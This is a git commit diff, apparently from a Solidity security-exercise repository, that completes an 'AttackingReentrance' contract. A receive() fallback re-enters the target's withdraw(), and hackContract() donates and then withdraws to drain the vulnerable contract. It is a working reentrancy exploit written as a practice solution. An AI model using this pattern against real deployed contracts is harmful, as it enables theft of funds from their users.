49c25418095267d137a206556d0f0e9bea9abc13
Milan <milansaxena10@gmail.com>
2022-09-04 12:48:39 -0700

    Finished Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -2,6 +2,12 @@
 pragma solidity ^0.8.9;
 import "./Reentrance.sol";
 
+interface ReentranceInterface {
+    function donate(address _to) external payable;
+    function withdraw() external;
+    function balanceOf(address _who) external view returns (uint256 balance);
+}
+
 contract AttackingReentrance {
     address payable public contractAddress;
 
@@ -9,7 +15,14 @@ contract AttackingReentrance {
         contractAddress = _contractAddress;
     }
 
+    receive () external payable {
+        ReentranceInterface(contractAddress).withdraw();
+    }
+
     function hackContract() external {
         // Code me!
+        uint256 balance = address(this).balance;
+        ReentranceInterface(contractAddress).donate{value: balance}(address(this));
+        ReentranceInterface(contractAddress).withdraw();
     }
 }
